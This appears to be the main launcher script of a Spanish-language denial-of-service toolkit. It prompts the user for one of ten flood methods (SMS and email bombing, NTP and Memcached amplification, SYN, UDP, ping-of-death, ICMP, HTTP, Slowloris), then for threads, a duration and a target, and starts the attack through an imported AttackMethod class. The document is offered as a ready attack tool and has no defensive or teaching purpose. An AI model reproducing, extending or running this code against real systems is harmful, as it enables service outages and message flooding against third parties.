# Import modules
import os
import sys
import argparse

# Go to current dir
os.chdir(os.path.dirname(os.path.realpath(__file__)))

try:
    from tools.crash import CriticalError
    import tools.addons.logo
    import tools.addons.winpcap
    from tools.addons.parametros import parametros
    from tools.method import AttackMethod    
except ImportError as err:
    print(f"Error al importar modulos, reintentando... \n")
    os.system("pip3 install -r requirements.txt")

try:
    from tools.crash import CriticalError
    import tools.addons.logo
    import tools.addons.winpcap
    from tools.addons import parametros
    from tools.method import AttackMethod
except ImportError as err:
    print("Error al importar modulos, reinstale el producto")
    sys.exit(1)

#Metodo
print("""Elija el metodo:
1- SMS
2- EMAIL
3- NTP
4- SYN
5- UDP
6- POD
7- ICMP
8- HTTP
9- Slowloris
10- Memcached""")
opcion = (int)(input())
method = parametros.metodo(opcion)

#Hilos
print("Cantidad de hilos: ")
threads = (int)(input())

#Tiempo
print("Cantidad de tiempo")
time = (int)(input())

#Objetivo
print("Objetivo")
target = input()

# Get args
#args = parser.parse_args()
#threads = args.threads
#time = args.time
#method = str(args.method).upper()
#target = args.target


if __name__ == "__main__":
    
    # Ataque
    with AttackMethod(
        duration=time, name=method, threads=threads, target=target
    ) as Flood:
        Flood.Start()
